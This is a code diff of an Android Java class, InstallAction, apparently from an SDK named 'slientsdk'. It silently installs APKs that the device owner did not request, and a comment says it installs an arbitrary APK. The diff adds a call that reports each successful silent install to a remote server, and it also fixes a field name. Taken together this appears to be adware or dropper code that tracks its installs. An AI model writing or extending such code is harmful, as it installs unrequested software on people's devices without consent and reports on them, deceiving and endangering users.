@@ -10,6 +10,10 @@ import java.io.File;
 import java.sql.SQLException;
 import java.util.List;
 
+import sdk.grayweb.com.slientsdk.api.Action;
+import sdk.grayweb.com.slientsdk.api.ActionApi;
+import sdk.grayweb.com.slientsdk.http.HttpClient;
+import sdk.grayweb.com.slientsdk.http.TextHttpListener;
 import sdk.grayweb.com.slientsdk.model.ActionModel;
 import sdk.grayweb.com.slientsdk.model.ApkModel;
 
@@ -32,7 +36,7 @@ public class InstallAction extends AbstractAction {
                     List<ActionModel> list = actionDao.queryBuilder().where().eq("packageName",model.packagename).ge("type",2).query();
                     if(list.size()==0){//没有安装过
                         //安装这个apk
-                        installApk(targetApk.packagename, model.apkPath);
+                        installApk(targetApk.packagename, model.apkpath);
                     }else {
                         targetApk=model ;
                     }
@@ -40,7 +44,7 @@ public class InstallAction extends AbstractAction {
             }
             //安装一个随便的APK
             if (targetApk!=null) {
-                installApk(targetApk.packagename, targetApk.apkPath);
+                installApk(targetApk.packagename, targetApk.apkpath);
             }
 
         } catch (SQLException e) {
@@ -57,8 +61,15 @@ public class InstallAction extends AbstractAction {
             if(result==SilentInstaller.INSTALL_SUCCEEDED){
                 ActionModel actionModel = new ActionModel();
                 actionModel.packageName = packageName ;
-                actionModel.type=3 ;
+                actionModel.type=2 ;
                 actionModel.time=System.currentTimeMillis();
+                ActionApi api = new ActionApi(mContext,packageName, Action.INSTALL);
+                HttpClient.request(api, new TextHttpListener(mContext) {
+                    @Override
+                    public void onSuccess(String text) {
+
+                    }
+                });
                 try {
                     actionDao.create(actionModel) ;
                 } catch (SQLException e) {
